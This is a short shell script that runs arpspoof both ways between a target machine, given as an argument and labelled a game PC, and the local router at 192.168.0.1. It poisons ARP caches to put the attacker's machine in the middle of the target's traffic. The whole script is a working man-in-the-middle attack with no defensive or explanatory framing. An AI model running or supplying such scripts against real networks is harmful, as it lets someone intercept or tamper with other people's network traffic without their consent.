# <game_pc_ip>
echo "arpspoofing middle pc > router"
sudo arpspoof -i enp0s25 -t $1 192.168.0.1 &
P1=$!
sleep 2 &
echo "arpspoofing router > middle pc"
sudo arpspoof -i enp0s25 -t 192.168.0.1 $1 &
P2=$!
wait $P1 $P2
